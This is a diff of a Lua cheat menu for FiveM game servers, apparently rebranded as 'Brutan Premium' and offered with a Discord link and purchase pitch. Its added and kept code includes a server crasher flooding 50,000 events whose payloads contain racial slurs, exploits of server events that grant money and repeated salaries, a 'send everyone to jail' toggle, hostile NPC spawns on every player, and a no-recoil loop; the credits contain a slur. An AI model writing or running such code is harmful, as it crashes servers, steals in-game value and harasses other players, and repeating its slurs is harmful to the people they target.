+                    SetDiscordRichPresenceAsset('Brutan Premium')
+                    
+					SetRichPresence('Brutan#7799')
+			
+                    SetDiscordRichPresenceAssetText('Brutan Premium | Lol Fuck you')
+                
+                    SetDiscordRichPresenceAssetSmall('Brutan Premium')
+            
+                    SetDiscordRichPresenceAssetSmallText('BRUTAN ON YOUTUBE')
+            
+                end
+		
             if SuperJump then
                 SetSuperJumpThisFrame(PlayerId())
             end
@@ -4215,6 +5399,95 @@ Citizen.CreateThread(
 			if ePunch then
 				SetExplosiveMeleeThisFrame(PlayerId())
 			end
+			
+			if NOXJDSS then
+                local cI = {
+                    [453432689] = 1.0,
+                    [3219281620] = 1.0,
+                    [1593441988] = 1.0,
+                    [584646201] = 1.0,
+                    [2578377531] = 1.0,
+                    [324215364] = 1.0,
+                    [736523883] = 1.0,
+                    [2024373456] = 1.0,
+                    [4024951519] = 1.0,
+                    [3220176749] = 1.0,
+                    [961495388] = 1.0,
+                    [2210333304] = 1.0,
+                    [4208062921] = 1.0,
+                    [2937143193] = 1.0,
+                    [2634544996] = 1.0,
+                    [2144741730] = 1.0,
+                    [3686625920] = 1.0,
+                    [487013001] = 1.0,
+                    [1432025498] = 1.0,
+                    [2017895192] = 1.0,
+                    [3800352039] = 1.0,
+                    [2640438543] = 1.0,
+                    [911657153] = 1.0,
+                    [100416529] = 1.0,
+                    [205991906] = 1.0,
+                    [177293209] = 1.0,
+                    [856002082] = 1.0,
+                    [2726580491] = 1.0,
+                    [1305664598] = 1.0,
+                    [2982836145] = 1.0,
+                    [1752584910] = 1.0,
+                    [1119849093] = 1.0,
+                    [3218215474] = 1.0,
+                    [1627465347] = 1.0,
+                    [3231910285] = 1.0,
+                    [-1768145561] = 1.0,
+                    [3523564046] = 1.0,
+                    [2132975508] = 1.0,
+                    [-2066285827] = 1.0,
+                    [137902532] = 1.0,
+                    [2828843422] = 1.0,
+                    [984333226] = 1.0,
+                    [3342088282] = 1.0,
+                    [1785463520] = 1.0,
+                    [1672152130] = 0,
+                    [1198879012] = 1.0,
+                    [171789620] = 1.0,
+                    [3696079510] = 1.0,
+                    [1834241177] = 1.0,
+                    [3675956304] = 1.0,
+                    [3249783761] = 1.0,
+                    [-879347409] = 1.0,
+                    [4019527611] = 1.0,
+                    [1649403952] = 1.0,
+                    [317205821] = 1.0,
+                    [125959754] = 1.0,
+                    [3173288789] = 1.0
+                }
+                if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
+                    local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
+                    _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
+                    if cI[cJ] and cI[cJ] ~= 0 then
+                        tv = 0
+                        if GetFollowPedCamViewMode() ~= 4 then
+                            repeat
+                                Wait(0)
+                                p = GetGameplayCamRelativePitch()
+                                SetGameplayCamRelativePitch(p + 0.0, 0.0)
+                                tv = tv + 0.0
+                            until tv >= cI[cJ]
+                        else
+                            repeat
+                                Wait(0)
+                                p = GetGameplayCamRelativePitch()
+                                if cI[cJ] > 0.0 then
+                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
+                                    tv = tv + 0.0
+                                else
+                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
+                                    tv = tv + 0.0
+                                end
+                            until tv >= cI[cJ]
+                        end
+                    end
+                end
+            end
 
             if Oneshot then
                 SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
@@ -4247,108 +5520,446 @@ Citizen.CreateThread(
             end
         end
     end)
-
 Citizen.CreateThread(
     function()
 
         local currentTint = 1
         local selectedTint = 1
 
-        Plane.CreateMenu("MainMenu", "BRUTAN V9.4")
-        Plane.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
-        Plane.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
-        Plane.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
-        Plane.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
-        Plane.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
-        Plane.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
-        Plane.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
-        Plane.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
-        Plane.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
-        Plane.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
-        Plane.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
-        Plane.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
-		Plane.CreateSubMenu("AI", "MainMenu", "AI Menu")
-		Plane.CreateSubMenu("Credits", "MainMenu", "Credits")
-        Plane.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
-        Plane.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
-        Plane.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
-        Plane.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
-        Plane.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
-        Plane.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
-        Plane.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
-        Plane.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
-        Plane.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
-        Plane.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
-        Plane.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
-        Plane.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
-        Plane.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
-        Plane.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
-        Plane.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
-        Plane.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
-        Plane.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
+        BrutanPremium.CreateMenu("MainMenu", "BrutanPremium")
+        BrutanPremium.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
+		BrutanPremium.CreateSubMenu("PedMenu", "SelfMenu", "Ped Menu")
+        BrutanPremium.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
+        BrutanPremium.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
+        BrutanPremium.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
+        BrutanPremium.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
+		BrutanPremium.CreateSubMenu('LulxDJ', 'MaliciousMenu', 'ESP Menu')
+        BrutanPremium.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
+        BrutanPremium.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
+        BrutanPremium.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
+        BrutanPremium.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
+        BrutanPremium.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
+        BrutanPremium.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
+		BrutanPremium.CreateSubMenu("Hedit", "VehMenu", "Handling")
+	    BrutanPremium.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
+        BrutanPremium.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
+		BrutanPremium.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
+        BrutanPremium.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Vehicle types')
+        BrutanPremium.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Vehicle Options')
+        BrutanPremium.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
+        BrutanPremium.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
+        BrutanPremium.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
+		BrutanPremium.CreateSubMenu("AI", "MainMenu", "AI Menu")
+        BrutanPremium.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
+        BrutanPremium.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
+        BrutanPremium.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
+        BrutanPremium.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
+        BrutanPremium.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
+        BrutanPremium.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
+        BrutanPremium.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
+        BrutanPremium.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
+        BrutanPremium.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
+        BrutanPremium.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
+        BrutanPremium.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
+        BrutanPremium.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
+        BrutanPremium.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
+		BrutanPremium.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
+        BrutanPremium.CreateSubMenu("performance", "LSC", "Performance Tuning")
+        BrutanPremium.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
+        BrutanPremium.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
+        BrutanPremium.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
+		BrutanPremium.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
+        BrutanPremium.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
+		BrutanPremium.CreateSubMenu("Credits", "SettingsMenu", "Credits")
+for i, dA in pairs(bd) do 
+                BrutanPremium.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
+                BrutanPremium.CreateSubMenu("primary", dA.id, "Primary Paint") 
+                BrutanPremium.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
+                BrutanPremium.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
+                BrutanPremium.CreateSubMenu("classic1", "primary", "Classic Paint") 
+                BrutanPremium.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
+                BrutanPremium.CreateSubMenu("matte1", "primary", "Matte Paint") 
+                BrutanPremium.CreateSubMenu("metal1", "primary", "Metal Paint") 
+                BrutanPremium.CreateSubMenu("classic2", "secondary", "Classic Paint") 
+                BrutanPremium.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
+                BrutanPremium.CreateSubMenu("matte2", "secondary", "Matte Paint") 
+                BrutanPremium.CreateSubMenu("metal2", "secondary", "Metal Paint") 
+                BrutanPremium.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
+                BrutanPremium.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
+                BrutanPremium.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
+                BrutanPremium.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
+            end 
+        end
+        for i, dA in pairs(be) do 
+            BrutanPremium.CreateSubMenu(dA.id, "performance", dA.name) 
+        end
+    
+        local SelectedPlayer
+    
+            while Enabled do
+    
+                local ped = PlayerPedId() 
+                local veh = GetVehiclePedIsUsing(ped) 
+                SetVehicleModKit(veh, 0) 
+                for i, dA in pairs(bd) do
+                    if BrutanPremium.IsMenuOpened("tunings") then
+                        if b8 then
+                            if ba == "neon" then 
+                                local r, g, b = table.unpack(b9) 
+                                SetVehicleNeonLightsColour(veh, r, g, b) 
+                                SetVehicleNeonLightEnabled(veh, 0, bc) 
+                                SetVehicleNeonLightEnabled(veh, 1, bc) 
+                                SetVehicleNeonLightEnabled(veh, 2, bc) 
+                                SetVehicleNeonLightEnabled(veh, 3, bc) 
+                                b8 = false 
+                                ba = -1 
+                                b9 = -1 
+                            elseif ba == "paint" then 
+                                local dB, dC, dD, dA = table.unpack(b9) 
+                                SetVehicleColours(veh, dB, dC) 
+                                SetVehicleExtraColours(veh, dD, dA) 
+                                b8 = false
+                                ba = -1; 
+                                b9 = -1
+                            else 
+                                if bc == "rm" then 
+                                    RemoveVehicleMod(veh, ba) 
+                                    b8 = false 
+                                    ba = -1 
+                                    b9 = -1
+                                else 
+                                    SetVehicleMod(veh, ba, b9, false) 
+                                    b8 = false 
+                                    ba = -1 
+                                    b9 = -1 
+                                end 
+                            end 
+                        end 
+                    end
+    
+                    if BrutanPremium.IsMenuOpened(dA.id) then
+                        if dA.id == "wheeltypes" then
+                            if BrutanPremium.Button("Sport Wheels") then 
+                                SetVehicleWheelType(veh, 0) 
+                            elseif BrutanPremium.Button("Muscle Wheels") then 
+                                SetVehicleWheelType(veh, 1) 
+                            elseif BrutanPremium.Button("Lowrider Wheels") then 
+                                SetVehicleWheelType(veh, 2) 
+                            elseif BrutanPremium.Button("SUV Wheels") then 
+                                SetVehicleWheelType(veh, 3) 
+                            elseif BrutanPremium.Button("Offroad Wheels") then 
+                                SetVehicleWheelType(veh, 4) 
+                            elseif BrutanPremium.Button("Tuner Wheels") then 
+                                SetVehicleWheelType(veh, 5) 
+                            elseif BrutanPremium.Button("High End Wheels") then 
+                                SetVehicleWheelType(veh, 7) 
+                            end
+                                
+                            BrutanPremium.Display() 
+                        elseif dA.id == "extra" then 
+                            local dF = checkValidVehicleExtras() 
+                            for i, dA in pairs(dF) do
+                                if IsVehicleExtraTurnedOn(veh, i) then 
+                                    pricestring = "Installed"
+                                else 
+                                    pricestring = "Not Installed"
+                                end
+                                if BrutanPremium.Button(dA.menuName, pricestring) then 
+                                    SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) 
+                                end 
+                            end 
+    
+                            BrutanPremium.Display() 
+                        elseif dA.id == "headlight" then
+                            if BrutanPremium.Button("None") then 
+                                SetVehicleHeadlightsColour(veh, -1) 
+                            end
+                            for dK, dA in pairs(bo) do 
+                                tp = GetVehicleHeadlightsColour(veh) 
+                                if tp == dA.id and not bg then 
+                                    pricetext = "Installed"
+                                else 
+                                    if bg and tp == dA.id then 
+                                        pricetext = "Previewing"
+                                    else pricetext = "Not Installed"
+                                    end 
+                                end
+                                head = GetVehicleHeadlightsColour(veh) 
+                                if BrutanPremium.Button(dA.name, pricetext) then
+                                    if not bg then 
+                                        bi = "headlight"
+                                        bk = false
+                                        oldhead = GetVehicleHeadlightsColour(veh) 
+                                        bh = table.pack(oldhead) 
+                                        SetVehicleHeadlightsColour(veh, dA.id) 
+                                        bg = true 
+                                    elseif bg and head == dA.id then 
+                                        ToggleVehicleMod(veh, 22, true) 
+                                        SetVehicleHeadlightsColour(veh, dA.id) 
+                                        bg = false; bi = -1; bh = -1 
+                                    elseif bg and head ~= dA.id then 
+                                        SetVehicleHeadlightsColour(veh, dA.id) bg = true 
+                                    end 
+                                end 
+                            end
+    
+                                BrutanPremium.Display() 
+                        elseif dA.id == "neon" then
+                            if BrutanPremium.Button("None") then 
+                                SetVehicleNeonLightsColour(veh, 255, 255, 255) 
+                                SetVehicleNeonLightEnabled(veh, 0, false) 
+                                SetVehicleNeonLightEnabled(veh, 1, false) 
+                                SetVehicleNeonLightEnabled(veh, 2, false) 
+                                SetVehicleNeonLightEnabled(veh, 3, false) 
+                            end
+                            for i, dA in pairs(colors) do 
+                                colorr, colorg, colorb = table.unpack(dA) 
+                                r, g, b = GetVehicleNeonLightsColour(veh) 
+                                if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then 
+                                    pricestring = "Installed"
+                                else 
+                                    if b8 and colorr == r and colorg == g and colorb == b then 
+                                        pricestring = "Previewing"
+                                    else 
+                                        pricestring = "Not Installed"
+                                    end 
+                                end
+                                if BrutanPremium.Button(i, pricestring) then
+                                    if not b8 then 
+                                        ba = "neon"
+                                        bc = IsVehicleNeonLightEnabled(veh, 1) 
+                                        oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) 
+                                        b9 = table.pack(oldr, oldg, oldb) 
+                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
+                                        SetVehicleNeonLightEnabled(veh, 0, true) 
+                                        SetVehicleNeonLightEnabled(veh, 1, true) 
+                                        SetVehicleNeonLightEnabled(veh, 2, true) 
+                                        SetVehicleNeonLightEnabled(veh, 3, true) 
+                                        b8 = true 
+                                    elseif b8 and colorr == r and colorg == g and colorb == b then 
+                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
+                                        SetVehicleNeonLightEnabled(veh, 0, true) 
+                                        SetVehicleNeonLightEnabled(veh, 1, true) 
+                                        SetVehicleNeonLightEnabled(veh, 2, true)
+                                        SetVehicleNeonLightEnabled(veh, 3, true) 
+                                        b8 = false 
+                                        ba = -1 
+                                        b9 = -1 
+                                    elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then 
+                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
+                                        SetVehicleNeonLightEnabled(veh, 0, true) 
+                                        SetVehicleNeonLightEnabled(veh, 1, true) 
+                                        SetVehicleNeonLightEnabled(veh, 2, true)
+                                        SetVehicleNeonLightEnabled(veh, 3, true) 
+                                        b8 = true 
+                                    end 
+                                end 
+                            end
+        
+                            BrutanPremium.Display() 
+                        elseif dA.id == "paint" then
+                            if BrutanPremium.MenuButton("~r~→  ~s~Primary Paint", "primary") then 
+                            elseif BrutanPremium.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then 
+                            elseif BrutanPremium.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then 
+                            end 
+                            BrutanPremium.Display()
+                        else 
+                            local as = checkValidVehicleMods(dA.id) 
+                            for dG, dH in pairs(as) do
+                                if dH.menuName == "Stock" then 
+                                    price = 0 
+                                end
+                                if dA.name == "Horns" then
+                                    for dI, dJ in pairs(horns) do
+                                        if dJ ==dG - 1 then 
+                                            dH.menuName = dI 
+                                        end 
+                                    end 
+                                end
+                                if dH.menuName == "NULL" then 
+                                    dH.menuname = "unknown"
+                                end
+                                if BrutanPremium.Button(dH.menuName, price) then
+                                    if not b8 then 
+                                        ba = dA.id
+                                        b9 = GetVehicleMod(veh, dA.id) 
+                                        b8 = true
+                                        if dH.data.realIndex == -1 then 
+                                            bc = "rm"
+                                            RemoveVehicleMod(veh, dH.data.modid) 
+                                            b8 = false 
+                                            ba = -1 
+                                            b9 = -1 
+                                            bc = false
+                                        else 
+                                            bc = false 
+                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
+                                        end 
+                                    elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then 
+                                        b8 = false 
+                                        ba = -1 
+                                        b9 = -1 
+                                        bc = false
+                                        if dH.data.realIndex == -1 then 
+                                            RemoveVehicleMod(veh, dH.data.modid)
+                                        else 
+                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
+                                        end 
+                                    elseif b8 and GetVehicleMod(veh, dA.id)  ~= dH.data.realIndex then
+                                        if dH.data.realIndex == -1 then 
+                                            RemoveVehicleMod(veh, dH.data.modid) 
+                                            b8 = false 
+                                            ba = -1 
+                                            b9 = -1 
+                                            bc = false
+                                        else 
+                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
+                                            b8 = true 
+                                        end 
+                                    end 
+                                end 
+                            end 
+                                        BrutanPremium.Display() 
+                        end 
+                    end 
+                end
+    
+            for i, dA in pairs(be) do
+                if BrutanPremium.IsMenuOpened(dA.id) then
+                if GetVehicleMod(veh, dA.id) == 0 then pricestock = "Not Installed"
+                price1 = "Installed"
+                price2 = "Not Installed"
+                price3 = "Not Installed"
+                price4 = "Not Installed"
+                elseif GetVehicleMod(veh, dA.id) == 1 then pricestock = "Not Installed"
+                price1 = "Not Installed"
+                price2 = "Installed"
+                price3 = "Not Installed"
+                price4 = "Not Installed"
+                elseif GetVehicleMod(veh, dA.id) == 2 then pricestock = "Not Installed"
+                price1 = "Not Installed"
+                price2 = "Not Installed"
+                price3 = "Installed"
+                price4 = "Not Installed"
+                elseif GetVehicleMod(veh, dA.id) == 3 then pricestock = "Not Installed"
+                price1 = "Not Installed"
+                price2 = "Not Installed"
+                price3 = "Not Installed"
+                price4 = "Installed"
+                elseif GetVehicleMod(veh, dA.id) == -1 then pricestock = "Installed"
+                price1 = "Not Installed"
+                price2 = "Not Installed"
+                price3 = "Not Installed"
+                price4 = "Not Installed"
+            end
+            if BrutanPremium.Button("Stock "..dA.name, pricestock) then 
+                SetVehicleMod(veh, dA.id, -1) 
+            elseif BrutanPremium.Button(dA.name.." Upgrade 1", price1) then 
+                SetVehicleMod(veh, dA.id, 0) 
+            elseif BrutanPremium.Button(dA.name.." Upgrade 2", price2) then 
+                SetVehicleMod(veh, dA.id, 1) 
+            elseif BrutanPremium.Button(dA.name.." Upgrade 3", price3) then 
+                SetVehicleMod(veh, dA.id, 2) 
+            elseif dA.id ~= 13 and dA.id ~= 12 and BrutanPremium.Button(dA.name.." Upgrade 4", price4) then 
+                SetVehicleMod(veh, dA.id, 3) end; BrutanPremium.Display() 
+            end 
+        end
 
-        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
-                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
-                            "TeleportMenu", "LSC", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
-                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
-                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
-                            "ESXMiscMenu", "ESXDrugMenu", "AI", "Credits", "VRPMenu"}
-
-
-        while Enabled do
-            if Plane.IsMenuOpened("MainMenu") then
-                drawNotification("~h~~b~BRUTAN ~s~V9.4")
-                drawNotification("~h~~s~Made by ~b~Brutan#3927")
-                if Plane.MenuButton    ("Self Menu", "SelfMenu") then
-                elseif Plane.MenuButton("Teleport Menu", "TeleportMenu") then
-				elseif Plane.MenuButton("AI Menu", "AI") then
-                elseif Plane.MenuButton("~b~Online~s~ Players", "OnlinePlayersMenu") then
-                elseif Plane.MenuButton("Weapon Menu", "WeaponMenu") then
-                elseif Plane.MenuButton("Vehicle Menu", "VehMenu") then
-                elseif Plane.MenuButton("Malicious Hacks", "MaliciousMenu") then
-                elseif Plane.MenuButton("Trolling Options", "TrollMenu") then
-                elseif Plane.MenuButton("~g~ESX~s~ Options", "ESXMenu") then
-                elseif Plane.MenuButton("~b~VRP~s~ Options", "VRPMenu") then
-				elseif Plane.MenuButton("~g~~h~Credits", "Credits") then
-                elseif Plane.Button("~h~~r~Disable Menu") then
+            if BrutanPremium.IsMenuOpened("MainMenu") then
+                drawNotification("~h~~r~Brutan ~s~Premium")
+                drawNotification("~h~~s~BRUTAN ON YOUTUBE")
+                if BrutanPremium.MenuButton    ("~r~→  ~s~Self Menu", "SelfMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Teleport Menu", "TeleportMenu") then
+				elseif BrutanPremium.MenuButton("~r~→  ~s~AI", "AI") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Online Players", "OnlinePlayersMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Weapon Menu", "WeaponMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Vehicle Menu", "VehMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Extreme Menu", "MaliciousMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Troll Menu", "TrollMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Options", "ESXMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~VRP Options", "VRPMenu") then
+				elseif BrutanPremium.MenuButton("~r~→  ~s~Settings", "SettingsMenu") then
+                elseif BrutanPremium.Button("~r~→  ~s~~r~Close The Menu  ←") then
                     Enabled = false
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("VRPMenu") then
-                if Plane.Button("VRP PayGarage 100$") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VRPMenu") then
+                if BrutanPremium.Button("VRP PayGarage 100$") then
                     TriggerServerEvent("lscustoms:payGarage", {costs = -100})
-                elseif Plane.Button("VRP PayGarage 1000$") then
+                elseif BrutanPremium.Button("VRP PayGarage 1000$") then
                     TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
-                elseif Plane.Button("VRP PayGarage 10 000$") then
+                elseif BrutanPremium.Button("VRP PayGarage 10 000$") then
                     TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
-                elseif Plane.Button("VRP PayGarage 100 000$") then
+                elseif BrutanPremium.Button("VRP PayGarage 100 000$") then
                     TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
-                elseif Plane.Button("VRP Get Driver Licence") then
+                elseif BrutanPremium.Button("VRP Get Driver Licence") then
                     TriggerServerEvent("dmv:success")
-                elseif Plane.Button("VRP Bank Deposit") then
+				elseif BrutanPremium.Button("Give yourself 10x salary (VRP)") then
+				a=1 repeat TriggerServerEvent('paycheck:salary') a=a+1 until (a>10)
+				a=1 repeat TriggerServerEvent('paycheck:bonus') a=a+1 until (a>10)
+                elseif BrutanPremium.Button("VRP Bank Deposit") then
                     local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                     TriggerServerEvent("bank:deposit", amount)
-                elseif Plane.Button("VRP Bank Withdraw") then
+                elseif BrutanPremium.Button("VRP Bank Withdraw") then
                     local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                     TriggerServerEvent("bank:withdraw", amount)
-                elseif Plane.Button("VRP Slot Machine") then
+                elseif BrutanPremium.Button("VRP Slot Machine") then
                     local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                     TriggerServerEvent("vrp_slotmachine:server:2", amount)
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("TrollMenu") then
-                if Plane.Button("ESX Server Crasher") then
+                BrutanPremium.Display()
+			                elseif BrutanPremium.IsMenuOpened("SettingsMenu") then
+                if BrutanPremium.ComboBox("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
+                    currentMenuX = currentIndex
+                    selectedMenuX = selectedIndex
+                    for i = 1, #allMenus do
+                        BrutanPremium.SetMenuX(allMenus[i], menuX[currentMenuX])
+                    end
+                    end) 
+                    then
+                elseif BrutanPremium.ComboBox("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
+                    currentMenuY = currentIndex
+                    selectedMenuY = selectedIndex
+                    for i = 1, #allMenus do
+                        BrutanPremium.SetMenuY(allMenus[i], menuY[currentMenuY])
+                    end
+                    end)
+                    then
+                    elseif BrutanPremium.CheckBox("~u~Discord~s~ Display", discordPresence, function(enabled) discordPresence = enabled end) then
+					elseif BrutanPremium.MenuButton("~r~→  ~s~Information", "InfoMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Credits", "Credits") then
+                    end
+    
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("InfoMenu") then
+                    if BrutanPremium.Button("BrutanPremium") then
+					elseif BrutanPremium.Button("discord.gg/ZtZMsyNnMq") then
+                    end
+    
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("Credits") then
+				if     BrutanPremium.Button("~h~Press on our names <3") then
+				elseif BrutanPremium.Button("∑  ~r~~h~NEMESiS~s~ - ~r~DEV") then
+				drawNotification('~h~Contact him for More releases.')
+				drawNotification('~h~Also contact him if you want to purchase any menu.')
+				elseif BrutanPremium.Button("∑  ~r~~h~Real Nigg~s~ - ~r~DEV") then
+				elseif BrutanPremium.Button("∑  ~r~~h~Brutan~s~ - ~r~DEV") then
+				end
+					
+					BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("TrollMenu") then
+                if BrutanPremium.Button("ESX Server Crasher") then
                     for i = 1, 50000 do TriggerServerEvent("esx_skin:responseSaveSkin", {niggers = "gay"}) TriggerServerEvent("esx_skin:responseSaveSkin", "niggers eat shit") end
-                elseif  Plane.CheckBox(
+                elseif  BrutanPremium.CheckBox(
                     "Send everyone to jail",
                     banallusers,
                     function(enabled)
                     banallusers = enabled
                     end)
                 then
-				elseif Plane.Button("Spawn moutain Lion On Everyone") then
+				elseif BrutanPremium.Button("Spawn moutain Lion On Everyone") then
                     local mtlion = "A_C_MtLion"
                     for i = 0, 128 do
                         local co = GetEntityCoords(GetPlayerPed(i))
@@ -4373,7 +5984,7 @@ Citizen.CreateThread(
                             end
                         end
                     end
-				elseif Plane.Button("SWAT W/ Railgun On Everyone") then
+				elseif BrutanPremium.Button("SWAT W/ Railgun On Everyone") then
                     local swat = "s_m_y_swat_01"
 					local bR = "weapon_railgun"
                     for i = 0, 128 do
@@ -4403,42 +6014,92 @@ Citizen.CreateThread(
                             end
                         end
                     end
-                elseif Plane.Button("Nuke Server") then
